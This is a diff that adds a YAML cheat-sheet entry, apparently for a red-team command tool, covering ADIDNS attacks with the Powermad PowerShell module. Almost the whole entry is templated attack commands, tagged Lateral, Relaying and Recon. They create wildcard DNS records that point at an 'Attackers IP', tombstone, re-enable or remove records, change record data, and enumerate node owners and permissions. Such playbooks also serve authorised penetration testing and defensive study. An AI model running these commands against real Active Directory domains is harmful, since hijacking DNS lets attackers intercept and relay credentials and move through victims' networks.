@@ -1,0 +1,63 @@
+---
+projectLink: https://github.com/Kevin-Robertson/Powermad
+name: ADIDNS
+params:
+- name: DNSName
+  description: Name of new recored that will be created
+  default: '*'
+- name: DNSData
+  description: Attackers IP
+- name: DNSType
+  description: Type of recored that will be created 
+  default: A
+
+ 
+sections:
+- name: Create new DNS recored (wildcard available)
+  labels: ["Lateral", "Relaying"]
+  commands:
+  - language: PS
+    command: New-ADIDNSNode -Node {{DNSName}} -Data {{DNSData}}
+    
+- name: Remove existing DNS recored (tombstone before removeing)
+  labels: ["Lateral", "Relaying"]
+  commands:
+  - language: PS
+    command: Remove-ADIDNSNode -Node {{DNSName}}
+    
+- name: Create a tombstoned recored
+  labels: ["Lateral", "Relaying"]
+  commands:
+  - language: PS
+    command: New-ADIDNSNode -Node {{DNSName}} -Tombstone
+ 
+- name: Enable a tombstoned DNS record
+  labels: ["Lateral", "Relaying"]
+  commands:
+  - language: PS
+    command: Enable-ADIDNSNode -Node {{DNSName}}
+    
+- name: tombstone a DNS record
+  labels: ["Lateral", "Relaying"]
+  commands:
+  - language: PS
+    command: Disable-ADIDNSNode -Node {{DNSName}}
+    
+- name: Change DNS recored data
+  labels: ["Lateral", "Relaying"]
+  commands:
+  - language: PS
+    command: Invoke-DNSUpdate -DNSType {{DNSType}} -DNSName {{DNSName}} -DNSData {{DNSData}}
+ 
+- name: Get the owenr of a node
+  labels: ["Recon"]
+  commands:
+  - language: PS
+    command: Get-ADIDNSNodeOwner -Node {{DNSName}}
+    
+- name: Get the DACL for a DNS node
+  labels: ["Recon"]
+  commands:
+  - language: PS
+    command: Get-ADIDNSPermission -Node {{DNSName}}
+   
